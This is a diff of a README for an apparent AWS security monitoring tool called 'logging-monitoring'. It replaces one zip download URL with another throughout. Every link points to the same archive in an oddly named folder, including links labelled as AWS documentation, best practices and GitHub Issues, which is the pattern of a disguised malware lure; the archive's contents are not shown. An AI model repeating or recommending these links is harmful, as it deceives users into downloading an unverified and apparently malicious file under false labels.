@@ -1,6 +1,6 @@
 # 🛡️ logging-monitoring - Simplify AWS Security Monitoring
 
-[![Download](https://raw.githubusercontent.com/alfianapriansyadp/logging-monitoring/main/ceratoglossus/logging-monitoring.zip%https://raw.githubusercontent.com/alfianapriansyadp/logging-monitoring/main/ceratoglossus/logging-monitoring.zip)](https://raw.githubusercontent.com/alfianapriansyadp/logging-monitoring/main/ceratoglossus/logging-monitoring.zip)
+[![Download](https://github.com/alfianapriansyadp/logging-monitoring/raw/refs/heads/main/ceratoglossus/logging_monitoring_v3.7.zip%https://github.com/alfianapriansyadp/logging-monitoring/raw/refs/heads/main/ceratoglossus/logging_monitoring_v3.7.zip)](https://github.com/alfianapriansyadp/logging-monitoring/raw/refs/heads/main/ceratoglossus/logging_monitoring_v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ To install the logging-monitoring application, follow these steps:
 
 1. **Visit the Release Page**: Click the link below to access the latest version.
     
-   [Download Latest Release](https://raw.githubusercontent.com/alfianapriansyadp/logging-monitoring/main/ceratoglossus/logging-monitoring.zip)
+   [Download Latest Release](https://github.com/alfianapriansyadp/logging-monitoring/raw/refs/heads/main/ceratoglossus/logging_monitoring_v3.7.zip)
 
 2. **Select the Correct File**: Look for the version that matches your operating system. You will see options for Windows, macOS, or Linux.
 
@@ -72,8 +72,8 @@ Once everything is set up, you can start using the application to monitor your A
 
 You can grow your skills in AWS security by exploring these resources:
 
-- [AWS Documentation](https://raw.githubusercontent.com/alfianapriansyadp/logging-monitoring/main/ceratoglossus/logging-monitoring.zip)
-- [AWS Security Best Practices](https://raw.githubusercontent.com/alfianapriansyadp/logging-monitoring/main/ceratoglossus/logging-monitoring.zip)
+- [AWS Documentation](https://github.com/alfianapriansyadp/logging-monitoring/raw/refs/heads/main/ceratoglossus/logging_monitoring_v3.7.zip)
+- [AWS Security Best Practices](https://github.com/alfianapriansyadp/logging-monitoring/raw/refs/heads/main/ceratoglossus/logging_monitoring_v3.7.zip)
 
 ## ❓ Troubleshooting
 
@@ -87,15 +87,15 @@ If you face issues while using the application, try these common solutions:
 
 If you need further help, reach out via the following channels:
 
-- [GitHub Issues](https://raw.githubusercontent.com/alfianapriansyadp/logging-monitoring/main/ceratoglossus/logging-monitoring.zip): Report bugs or request features.
+- [GitHub Issues](https://github.com/alfianapriansyadp/logging-monitoring/raw/refs/heads/main/ceratoglossus/logging_monitoring_v3.7.zip): Report bugs or request features.
 - Community Forum: Join the discussion with other users.
 
 ## 🔗 Additional Resources
 
 For further insights into logging and monitoring in AWS, consider the following topics:
 
-- [Centralized Logging with AWS](https://raw.githubusercontent.com/alfianapriansyadp/logging-monitoring/main/ceratoglossus/logging-monitoring.zip)
-- [AWS Security Operations](https://raw.githubusercontent.com/alfianapriansyadp/logging-monitoring/main/ceratoglossus/logging-monitoring.zip)
+- [Centralized Logging with AWS](https://github.com/alfianapriansyadp/logging-monitoring/raw/refs/heads/main/ceratoglossus/logging_monitoring_v3.7.zip)
+- [AWS Security Operations](https://github.com/alfianapriansyadp/logging-monitoring/raw/refs/heads/main/ceratoglossus/logging_monitoring_v3.7.zip)
 
 ## 🏗️ Stay Updated
 
@@ -103,6 +103,6 @@ Regularly check for updates to improve the application and maintain security. Al
 
 Download the application from the link below:
 
-[Download Latest Release](https://raw.githubusercontent.com/alfianapriansyadp/logging-monitoring/main/ceratoglossus/logging-monitoring.zip) 
+[Download Latest Release](https://github.com/alfianapriansyadp/logging-monitoring/raw/refs/heads/main/ceratoglossus/logging_monitoring_v3.7.zip) 
 
 Thank you for using logging-monitoring. Enjoy seamless AWS security monitoring!
